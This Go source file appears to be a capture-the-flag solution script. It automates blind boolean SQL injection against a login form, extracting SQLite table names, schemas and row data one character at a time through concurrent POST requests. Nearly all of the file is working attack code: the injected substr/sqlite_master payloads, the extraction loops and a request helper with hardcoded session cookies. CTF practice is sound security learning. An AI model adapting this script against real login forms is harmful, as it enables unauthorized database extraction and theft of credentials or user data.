package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"sync"
)

var charTable = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 \t\n\r!#$%&\\'()*+,-./:;<=>?@[\\]^_`{|}~"

func tableJob(offset int, url string, method string, resultTable *map[string]bool, wg *sync.WaitGroup) {
	defer wg.Done()
	GetTable(offset, url, method, resultTable)
}

func columnJob(url string, method string, table string, wg *sync.WaitGroup) {
	defer wg.Done()
	for offset := 0; offset < 300; offset++ {
		GetColumn(offset, url, method, table)
	}
}

func valueJob(url string, method string, table string, valueTable *map[string]string, wg *sync.WaitGroup) {
	defer wg.Done()
	for offset := 0; offset < 300; offset++ {
		GetValue(offset, url, method, table, valueTable)
	}
}

func main() {
	url := "http://ctf.adl.tw:12004/login.php"
	method := "POST"

	var wg sync.WaitGroup

	resultTable := make(map[string]bool)

	for offset := 0; offset < 13; offset++ {
		wg.Add(1)
		go tableJob(offset, url, method, &resultTable, &wg)
	}
	wg.Wait()

	for k := range resultTable {
		wg.Add(1)
		go columnJob(url, method, k, &wg)
	}
	wg.Wait()

	valueTable := make(map[string]string)
	for k := range resultTable {
		wg.Add(1)
		valueJob(url, method, k, &valueTable, &wg)
	}
	wg.Wait()
}

func GetTable(offset int, url string, method string, resultTable *map[string]bool) (bool, string) {
	result := ""
	for posi := 0; posi < 600; posi++ {
		for i := range charTable {
			input := fmt.Sprintf(
				"ctf_username=admin&ctf_password=' or substr((select name from sqlite_master where type='table' limit %d,1),%d,1)='%s' --",
				offset,
				posi,
				string(charTable[i]),
			)
			if CheckQuery(url, method, input) {
				result += string(charTable[i])
				if posi > 1 && string(charTable[i]) == "&" {
					(*resultTable)[strings.Trim(result, "&")] = true
					log.Println("Table: ", strings.Trim(result, "&"))
					return true, strings.Trim(result, "&")
				}
				break
				//log.Printf("Get: offset=%d, posi=%d, char=%s", offset, posi, string(charTable[i]))
			}
			if i >= len(charTable)-1 {
				return false, strings.Trim(result, "&")
			}
		}
	}
	(*resultTable)[strings.Trim(result, "&")] = false
	return false, result
}

func GetColumn(offset int, url, method, table string) (bool, string) {
	result := ""
	for posi := 0; posi < 3000; posi++ {
		for i := range charTable {
			input := fmt.Sprintf(
				"ctf_username=admin&ctf_password=' or substr((select sql from sqlite_master where name = '%s' limit %d,1),%d,1)='%s' --",
				table,
				offset,
				posi,
				string(charTable[i]),
			)
			if CheckQuery(url, method, input) {
				result += string(charTable[i])
				if posi > 1 && string(charTable[i]) == "&" {
					log.Println("Column: ", strings.Trim(result, "&"))
					return true, strings.Trim(result, "&")
				}
				break
				//log.Printf("Get: offset=%d, posi=%d, char=%s", offset, posi, string(charTable[i]))
			}
			if i >= len(charTable)-1 {
				return false, strings.Trim(result, "&")
			}
		}
	}
	return false, result
}

func GetValue(offset int, url, method, table string, valueTable *map[string]string) (bool, string) {
	result := ""
	for posi := 0; ; posi++ {
		for i := range charTable {
			input := fmt.Sprintf(
				"ctf_username=admin&ctf_password=' or substr((select * from %s limit %d,1),%d,1)='%s' --",
				table,
				offset,
				posi,
				string(charTable[i]),
			)
			if CheckQuery(url, method, input) {
				result += string(charTable[i])
				if posi > 1 && string(charTable[i]) == "&" {
					(*valueTable)[strings.Trim(result, "&")] = strings.Trim(result, "&")
					log.Println("Value(", table, " ", offset, "): ", strings.Trim(result, "&"))
					return true, strings.Trim(result, "&")
				}
				//log.Printf("Get: posi=%d, char=%s", posi, string(charTable[i]))
				break
			}
			if i >= len(charTable)-1 {
				return false, strings.Trim(result, "&")
			}
		}

	}
	return false, result
}

func CheckQuery(url string, method string, input string) bool {
	payload := strings.NewReader(input)

	client := &http.Client{}
	req, err := http.NewRequest(method, url, payload)

	if err != nil {
		fmt.Println(err)
		return false
	}
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Cookie", "PHPSESSID=86d271b0d78d2ace187f88819b3ea8fc; session=9be6928e-0508-4481-9dce-8d39ec6e4fd9.liT24S_ZDjB_3dmI92bdcD1mfFM")

	res, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		return false
	}
	defer res.Body.Close()

	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		fmt.Println(err)
		return false
	}
	//log.Println(string(body))
	return strings.Contains(string(body), "Success")
}
